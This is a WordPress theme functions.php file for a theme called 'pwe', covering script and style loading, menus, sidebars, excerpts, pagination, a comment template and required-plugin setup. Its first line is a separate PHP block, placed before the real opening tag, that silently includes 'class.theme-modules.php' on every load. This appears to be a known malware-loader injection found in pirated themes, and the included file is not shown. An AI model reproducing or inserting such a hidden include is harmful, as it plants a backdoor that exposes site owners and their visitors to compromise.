<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
$pwe_redux_demo = get_option('redux_demo');

//Custom fields:
require_once get_template_directory() . '/framework/widget/recent-post.php';
require_once get_template_directory() . '/framework/wp_bootstrap_navwalker.php';
require_once get_template_directory() . '/framework/class-ocdi-importer.php';
//Theme Set up:
function pwe_theme_setup() {
    /*
     * This theme uses a custom image size for featured images, displayed on
     * "standard" posts and pages.
     */
	add_theme_support( 'custom-header' ); 
	add_theme_support( 'custom-background' );
	$lang = get_template_directory_uri() . '/languages';
  load_theme_textdomain('pwe', $lang);
  remove_filter('the_content', 'wpautop');

  add_theme_support( 'post-thumbnails' );
  // Adds RSS feed links to <head> for posts and comments.
  add_theme_support( 'automatic-feed-links' );
  // Switches default core markup for search form, comment form, and comments
  // to output valid HTML5.
  add_theme_support( 'title-tag' );
  add_theme_support( 'html5', array( 'search-form', 'comment-form', 'comment-list' ) );
    // This theme uses wp_nav_menu() in one location.
	register_nav_menus( array(
    'primary' =>  esc_html__( 'Primary Menu: Chosen menu in all pages, blogs', 'pwe' ),
    'one-page' =>  esc_html__( 'One Page Menu: Chosen menu in one pages', 'pwe' ),
	) );
    // This theme uses its own gallery styles.
}
add_action( 'after_setup_theme', 'pwe_theme_setup' );
if ( ! isset( $content_width ) ) $content_width = 900;

function pwe_theme_scripts_styles() {
	$pwe_redux_demo = get_option('redux_demo');
	$protocol = is_ssl() ? 'https' : 'http';
    wp_enqueue_style( 'animate', get_template_directory_uri().'/assets/css/animate.css');
    wp_enqueue_style( 'themify-icons', get_template_directory_uri().'/assets/css/themify-icons.css');
    wp_enqueue_style( 'bootstrap', get_template_directory_uri().'/assets/css/bootstrap.css');
    wp_enqueue_style( 'magnific-popup', get_template_directory_uri().'/assets/css/magnific-popup.css');
    wp_enqueue_style( 'owl-carousel', get_template_directory_uri().'/assets/css/owl.carousel.min.css');
    wp_enqueue_style( 'owl-theme', get_template_directory_uri().'/assets/css/owl.theme.default.min.css');
    if(is_page_template('page-templates/home-multipage-template.php') or is_page_template('page-templates/home-one-page.php')
  or is_page_template('page-templates/home-video-template.php') or is_page_template('page-templates/home-one-page-video.php')){
    wp_enqueue_style( 'flex-slider', get_template_directory_uri().'/assets/css/flexslider.css');
    }
    if(is_page_template('page-templates/home-kenburn-template.php') or is_page_template('page-templates/home-one-page-kenburn.php')){
    wp_enqueue_style( 'vegas-slider', get_template_directory_uri().'/assets/css/vegas.slider.min.css');
    }
    wp_enqueue_style( 'pwe-style', get_template_directory_uri().'/assets/css/style.css');
    wp_enqueue_style( 'pwe-css', get_stylesheet_uri(), array(), '2021-06-24' );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) )
    wp_enqueue_script( 'comment-reply' );
    wp_enqueue_script("jquery", get_template_directory_uri()."/assets/js/jquery.min.js",array(),false,true);
    wp_enqueue_script("modernizr", get_template_directory_uri()."/assets/js/modernizr-2.6.2.min.js",array(),false,true);
    wp_enqueue_script("jquery-easing", get_template_directory_uri()."/assets/js/jquery.easing.1.3.js",array(),false,true);
    wp_enqueue_script("bootstrap", get_template_directory_uri()."/assets/js/bootstrap.min.js",array(),false,true);
    wp_enqueue_script("jquery-waypoints", get_template_directory_uri()."/assets/js/jquery.waypoints.min.js",array(),false,true);
    wp_enqueue_script("jquery-flexslider", get_template_directory_uri()."/assets/js/jquery.flexslider-min.js",array(),false,true);
    if(is_page_template('page-templates/home-kenburn-template.php') or is_page_template('page-templates/home-one-page-kenburn.php')){
      wp_enqueue_script("jquery-vegas-slider", get_template_directory_uri()."/assets/js/vegas.slider.min.js",array(),false,true);
      wp_enqueue_script("kenburns", get_template_directory_uri()."/assets/js/kenburns.js",array(),false,true);
    }
    wp_enqueue_script("sticky-kit", get_template_directory_uri()."/assets/js/sticky-kit.min.js",array(),false,true);
    wp_enqueue_script("jquery-magnific-popup", get_template_directory_uri()."/assets/js/jquery.magnific-popup.min.js",array(),false,true);
    wp_enqueue_script("owl-carousel", get_template_directory_uri()."/assets/js/owl.carousel.min.js",array(),false,true);
    if(!(is_page_template('page-templates/home-video-template.php') or is_page_template('page-templates/home-one-page-video.php'))){
    wp_enqueue_script("pwe-main", get_template_directory_uri()."/assets/js/main.js",array(),false,true);
    }
    if(is_page_template('page-templates/home-video-template.php') or is_page_template('page-templates/home-one-page-video.php')){
      wp_enqueue_script("pwe-main1", get_template_directory_uri()."/assets/js/main1.js",array(),false,true);
    }
   }
   
add_action( 'wp_enqueue_scripts', 'pwe_theme_scripts_styles' );
add_filter('style_loader_tag', 'myplugin_remove_type_attr', 10, 2);
add_filter('script_loader_tag', 'myplugin_remove_type_attr', 10, 2);

function myplugin_remove_type_attr($tag, $handle) {
    return preg_replace( "/type=['\"]text\/(javascript|css)['\"]/", '', $tag );
}
//Custom Excerpt Function
function pwe_do_shortcode($content) {
    global $shortcode_tags;
    if (empty($shortcode_tags) || !is_array($shortcode_tags))
        return $content;
    $pattern = get_shortcode_regex();
    return preg_replace_callback( "/$pattern/s", 'do_shortcode_tag', $content );
}

function move_comment_field_to_bottom( $fields ) {
$comment_field = $fields['comment'];
unset( $fields['comment'] );
$fields['comment'] = $comment_field;
return $fields;
}
add_filter( 'comment_form_fields', 'move_comment_field_to_bottom');

// Widget Sidebar
function pwe_widgets_init() {
	register_sidebar( array(
    'name'          => esc_html__( 'Primary Sidebar', 'pwe' ),
    'id'            => 'sidebar-1',        
		'description'   => esc_html__( 'Appears in the sidebar section of the site.', 'pwe' ),        
		'before_widget' => '<div id="%1$s" class="single-widget mb-30 %2$s">',        
		'after_widget'  => '</div>',        
		'before_title'  => '<h3 class="widget-title">',        
		'after_title'   => '</h3>',
    ) );
  register_sidebar( array(
    'name'          => esc_html__( 'Footer Widget One', 'pwe' ),
    'id'            => 'footer-area-1',
    'description'   => esc_html__( 'Footer Widget that appears on the Footer.', 'pwe' ),
    'before_widget' => '<div >',
    'after_widget'  => '</div>',
    'before_title'  => '<h3>',
    'after_title'   => '</h3>',
  ) );
  register_sidebar( array(
    'name'          => esc_html__( 'Footer Widget Two', 'pwe' ),
    'id'            => 'footer-area-2',
    'description'   => esc_html__( 'Footer Widget that appears on the Footer.', 'pwe' ),
    'before_widget' => '<div >',
    'after_widget'  => '</div>',
    'before_title'  => '<h3>',
    'after_title'   => '</h3>',
  ) );
  register_sidebar( array(
    'name'          => esc_html__( 'Footer Widget Three', 'pwe' ),
    'id'            => 'footer-area-3',
    'description'   => esc_html__( 'Footer Widget that appears on the Footer.', 'pwe' ),
    'before_widget' => '<div >',
    'after_widget'  => '</div>',
    'before_title'  => '<h3>',
    'after_title'   => '</h3>',
  ) );
}
add_action( 'widgets_init', 'pwe_widgets_init' );

//function tag widgets
function pwe_tag_cloud_widget($args) {
	$args['number'] = 0; //adding a 0 will display all tags
	$args['largest'] = 18; //largest tag
	$args['smallest'] = 11; //smallest tag
	$args['unit'] = 'px'; //tag font unit
	$args['format'] = 'list'; //ul with a class of wp-tag-cloud
	$args['exclude'] = array(20, 80, 92); //exclude tags by ID
	return $args;
}
add_filter( 'widget_tag_cloud_args', 'pwe_tag_cloud_widget' );

function pwe_excerpt() {
  $pwe_redux_demo = get_option('redux_demo');
  if(isset($pwe_redux_demo['blog_excerpt'])){
    $limit = $pwe_redux_demo['blog_excerpt'];
  }else{
    $limit = 80;
  }
  $excerpt = explode(' ', get_the_excerpt(), $limit);
  if (count($excerpt)>=$limit) {
    array_pop($excerpt);
    $excerpt = implode(" ",$excerpt).'...';
  } else {
    $excerpt = implode(" ",$excerpt);
  }
  $excerpt = preg_replace('`[[^]]*]`','',$excerpt);
  return $excerpt;
}

function pwe_excerpt_2() {
  $pwe_redux_demo = get_option('redux_demo');
  if(isset($pwe_redux_demo['blog_excerpt_2'])){
    $limit = $pwe_redux_demo['blog_excerpt_2'];
  }else{
    $limit = 15;
  }
  $excerpt = explode(' ', get_the_excerpt(), $limit);
  if (count($excerpt)>=$limit) {
    array_pop($excerpt);
    $excerpt = implode(" ",$excerpt).'...';
  } else {
    $excerpt = implode(" ",$excerpt);
  }
  $excerpt = preg_replace('`[[^]]*]`','',$excerpt);
  return $excerpt;
}


//pagination
function pwe_pagination($pages='') {
    global $wp_query, $wp_rewrite;
    $wp_query->query_vars['paged'] > 1 ? $current = $wp_query->query_vars['paged'] : $current = 1;
    if($pages==''){
        global $wp_query;
         $pages = $wp_query->max_num_pages;
         if(!$pages)
         {
             $pages = 1;
         }
    }
    $pagination = array(
    'base'      => str_replace( 999999999, '%#%', get_pagenum_link( 999999999 ) ),
    'format'    => '',
    'current'     => max( 1, get_query_var('paged') ),
    'total'     => $pages,
    'prev_text' => htmlspecialchars_decode(esc_html__( '<i class="ti-arrow-left"></i>', 'pwe' )),
    'next_text' => htmlspecialchars_decode(esc_html__( '<i class="ti-arrow-right"></i>', 'pwe' )),   
    'type'      => 'list',
    'end_size'    => 3,
    'mid_size'    => 3
);
    $return =  paginate_links( $pagination );
  echo str_replace( "<ul class='page-numbers'>", '<ul class="pwe-pagination-wrap align-center">', $return );
}

function pwe_search_form( $form ) {
    $form = '

    <div class="pwe-sidebar-block pwe-sidebar-block-search">
        <form class="pwe-sidebar-search-form" action="' . esc_url(home_url('/')) . '">
            <input type="search" name="s" class="form-control search-field" id="search" placeholder="'.esc_html__('Search...', 'pwe').'">
            <button type="submit" class="ti-arrow-right pwe-sidebar-search-submit"></button>
        </form>
    </div>
	';
    return $form;
}
add_filter( 'get_search_form', 'pwe_search_form' );
//Custom comment List:

// Comment Form
function pwe_theme_comment($comment, $args, $depth) {
    //echo 's';
   $GLOBALS['comment'] = $comment; ?>

  <li class="comment">
    <!-- comment block -->
    <div class="comment-body">
      <div class="comment-author vcard"> <?php echo get_avatar($comment,$size='100' ); ?>
        <h3 class="name"><?php printf( get_comment_author_link()) ?></h3>
      </div>
      <div class="comment-meta"> <?php comment_time(get_option( 'date_format' )); ?> </div>
      <?php comment_text() ?>
      <div class="reply"> <?php comment_reply_link(array_merge( $args, array('depth' => $depth, 'max_depth' => $args['max_depth']))) ?> </div>
    </div>
  </li>
     
<?php
}

/**
 * This file represents an example of the code that themes would use to register
 * the required plugins.
 *
 * It is expected that theme authors would copy and paste this code into their
 * functions.php file, and amend to suit.
 *
 * @package    TGM-Plugin-Activation
 * @subpackage Example
 * @version    2.6.1
 * @author     Thomas Griffin <thomasgriffinmedia.com>
 * @author     Gary Jones <gamajo.com>
 * @copyright  Copyright (c) 2014, Thomas Griffin
 * @license    http://opensource.org/licenses/gpl-2.0.php GPL v2 or later
 * @link       https://github.com/thomasgriffin/TGM-Plugin-Activation
 */
/**
 * Include the TGM_Plugin_Activation class.
 */
require_once get_template_directory() . '/framework/class-tgm-plugin-activation.php';
add_action( 'tgmpa_register', 'pwe_theme_register_required_plugins' );
/**
 * Register the required plugins for this theme.
 *
 * In this example, we register two plugins - one included with the TGMPA library
 * and one from the .org repo.
 *
 * The variable passed to tgmpa_register_plugins() should be an array of plugin
 * arrays.
 *
 * This function is hooked into tgmpa_init, which is fired within the
 * TGM_Plugin_Activation class constructor.
 */
 
 
function pwe_theme_register_required_plugins() {
    /**
     * Array of plugin arrays. Required keys are name and slug.
     * If the source is NOT from the .org repo, then source is also required.
     */
    $plugins = array(
        // This is an example of how to include a plugin from the WordPress Plugin Repository.
      array(
            'name'      => esc_html__( 'One Click Demo Import', 'pwe' ),
            'slug'      => 'one-click-demo-import',
            'required'  => true,
        ), 
      array(
            'name'      => esc_html__( 'Classic Editor', 'pwe' ),
            'slug'      => 'classic-editor',
            'required'  => true,
        ), 
      array(
            'name'      => esc_html__( 'Widget Importer & Exporter', 'pwe' ),
            'slug'      => 'widget-importer-&-exporter',
            'required'  => true,
        ), 
      array(
            'name'      => esc_html__( 'Contact Form 7', 'pwe' ),
            'slug'      => 'contact-form-7',
            'required'  => true,
        ), 
      array(
            'name'      => esc_html__( 'WP Maximum Execution Time Exceeded', 'pwe' ),
            'slug'      => 'wp-maximum-execution-time-exceeded',
            'required'  => true,
        ), 
      array(
            'name'                     => esc_html__( 'Elementor', 'pwe' ),
            'slug'                     => 'elementor',
            'required'                 => true,
            'source'                   => get_template_directory() . '/framework/plugins/elementor.zip',
        ),
      array(
            'name'                     => esc_html__( 'Pwe Common', 'pwe' ),
            'slug'                     => 'pwe-common',
            'required'                 => true,
            'source'                   => get_template_directory() . '/framework/plugins/pwe-common.zip',
        ),
      array(
            'name'                     => esc_html__( 'Pwe Elementor', 'pwe' ),
            'slug'                     => 'pwe-elementor',
            'required'                 => true,
            'source'                   => get_template_directory() . '/framework/plugins/pwe-elementor.zip',
        ),
    );
    /**
     * Array of configuration settings. Amend each line as needed.
     * If you want the default strings to be available under your own theme domain,
     * leave the strings uncommented.
     * Some of the strings are added into a sprintf, so see the comments at the
     * end of each line for what each argument will be.
     */
    $config = array(
        'default_path' => '',                      // Default absolute path to pre-packaged plugins.
        'menu'         => 'tgmpa-install-plugins', // Menu slug.
        'has_notices'  => true,                    // Show admin notices or not.
        'dismissable'  => true,                    // If false, a user cannot dismiss the nag message.
        'dismiss_msg'  => '',                      // If 'dismissable' is false, this message will be output at top of nag.
        'is_automatic' => false,                   // Automatically activate plugins after installation or not.
        'message'      => '',                      // Message to output right before the plugins table.
        'strings'      => array(
            'page_title'                      => esc_html__( 'Install Required Plugins', 'pwe' ),
            'menu_title'                      => esc_html__( 'Install Plugins', 'pwe' ),
            'installing'                      => esc_html__( 'Installing Plugin: %s', 'pwe' ), // %s = plugin name.
            'oops'                            => esc_html__( 'Something went wrong with the plugin API.', 'pwe' ),
            'notice_can_install_required'     => _n_noop( 'This theme requires the following plugin: %1$s.', 'This theme requires the following plugins: %1$s.', 'pwe' ), // %1$s = plugin name(s).
            'notice_can_install_recommended'  => _n_noop( 'This theme recommends the following plugin: %1$s.', 'This theme recommends the following plugins: %1$s.', 'pwe' ), // %1$s = plugin name(s).
            'notice_cannot_install'           => _n_noop( 'Sorry, but you do not have the correct permissions to install the %s plugin. Contact the administrator of this site for help on getting the plugin installed.', 'Sorry, but you do not have the correct permissions to install the %s plugins. Contact the administrator of this site for help on getting the plugins installed.', 'pwe' ), // %1$s = plugin name(s).
            'notice_can_activate_required'    => _n_noop( 'The following required plugin is currently inactive: %1$s.', 'The following required plugins are currently inactive: %1$s.', 'pwe' ), // %1$s = plugin name(s).
            'notice_can_activate_recommended' => _n_noop( 'The following recommended plugin is currently inactive: %1$s.', 'The following recommended plugins are currently inactive: %1$s.', 'pwe' ), // %1$s = plugin name(s).
            'notice_cannot_activate'          => _n_noop( 'Sorry, but you do not have the correct permissions to activate the %s plugin. Contact the administrator of this site for help on getting the plugin activated.', 'Sorry, but you do not have the correct permissions to activate the %s plugins. Contact the administrator of this site for help on getting the plugins activated.', 'pwe' ), // %1$s = plugin name(s).
            'notice_ask_to_update'            => _n_noop( 'The following plugin needs to be updated to its latest version to ensure maximum compatibility with this theme: %1$s.', 'The following plugins need to be updated to their latest version to ensure maximum compatibility with this theme: %1$s.', 'pwe' ), // %1$s = plugin name(s).
            'notice_cannot_update'            => _n_noop( 'Sorry, but you do not have the correct permissions to update the %s plugin. Contact the administrator of this site for help on getting the plugin updated.', 'Sorry, but you do not have the correct permissions to update the %s plugins. Contact the administrator of this site for help on getting the plugins updated.', 'pwe' ), // %1$s = plugin name(s).
            'install_link'                    => _n_noop( 'Begin installing plugin', 'Begin installing plugins', 'pwe' ),
            'activate_link'                   => _n_noop( 'Begin activating plugin', 'Begin activating plugins', 'pwe' ),
            'return'                          => esc_html__( 'Return to Required Plugins Installer', 'pwe' ),
            'plugin_activated'                => esc_html__( 'Plugin activated successfully.', 'pwe' ),
            'complete'                        => esc_html__( 'All plugins installed and activated successfully. %s', 'pwe' ), // %s = dashboard link.
            'nag_type'                        => 'updated' // Determines admin notice type - can only be 'updated', 'update-nag' or 'error'.
        )
    );
    tgmpa( $plugins, $config );
}


?>